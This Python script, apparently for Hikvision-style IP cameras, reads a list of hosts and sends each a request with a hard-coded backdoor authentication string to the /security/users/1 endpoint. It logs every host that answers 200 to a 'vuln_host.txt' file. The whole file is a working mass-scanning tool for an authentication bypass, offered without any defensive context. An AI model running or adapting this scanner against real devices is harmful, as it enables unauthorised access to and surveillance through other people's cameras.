import os , sys , requests
class hikTester:

    def hikTester(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        up_host = open(path + '/Host/up_host.txt', 'r').read().splitlines()
        BackdoorAuthArg = "auth=YWRtaW46MTEK"
        p = 0
        while p < len(up_host):
            ip_to_check = up_host[p]
            try:
                sys.stdout.write("\r" + "[##]Checking " + ip_to_check+ '          ')
                sys.stdout.flush()
                response = requests.get('http://' + ip_to_check + '/security/users/1?' + BackdoorAuthArg)
                if response.status_code == 200:
                    with open(path + '/Host/vuln_host.txt', 'a') as host_vuln:
                        host_vuln.write(ip_to_check + "\n")
                elif response.status_code == 401:
                    pass
                elif response.status_code == 404:
                    pass
                p += 1
            except requests.exceptions.ConnectionError:
                pass
                p += 1
            except requests.exceptions.InvalidURL:
                pass
                p += 1
